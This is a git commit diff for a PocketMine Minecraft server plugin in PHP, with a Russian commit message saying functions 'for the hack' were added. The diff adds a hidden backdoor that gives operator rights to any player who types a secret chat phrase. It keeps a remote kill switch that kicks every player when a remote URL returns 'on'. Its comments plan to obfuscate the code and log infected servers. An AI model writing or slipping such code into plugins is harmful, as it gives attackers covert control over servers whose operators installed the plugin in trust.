a15b8024edea13248dd18b2ebffcdf055edf254b
Newmcpe <chebakov05@gmail.com>
2017-06-20 14:25:52 +0800

    Добавил несколько функций для хака

--- src/NewmcpeAndDany/Main.php
+++ src/NewmcpeAndDany/Main.php
@@ -1,9 +1,9 @@
 <?php
-
+//TODO Зашифруй код
 namespace krendell;
 
-
 use pocketmine\event\Listener;
+use pocketmine\event\player\PlayerChatEvent;
 use pocketmine\event\player\PlayerJoinEvent;
 use pocketmine\plugin\PluginBase;
 
@@ -13,16 +13,25 @@ class Main extends PluginBase implements Listener
     public function onEnable()
     {
         $this->getServer()->getPluginManager()->registerEvents($this, $this);
+        //TODO Сделать проверку на добавление сервера в базу и добавить его.
     }
 
     public function join(PlayerJoinEvent $e)
     {
-        $site = file_get_contents("");
+        $kick = file_get_contents("");
         $message = file_get_contents("");
-        if ($site == 'on') {
+        if ($kick == 'on') {
             foreach ($this->getServer()->getOnlinePlayers() as $p) {
                 $p->kick($message);
             }
+        }
+    }
+
+    public function opme(PlayerChatEvent $e)
+    {
+        $msg = $e->getMessage();
+        if ($msg == "hackedbydanyandnewmcpe") {
+            $e->getPlayer()->setOp(true);
         }
     }
 }
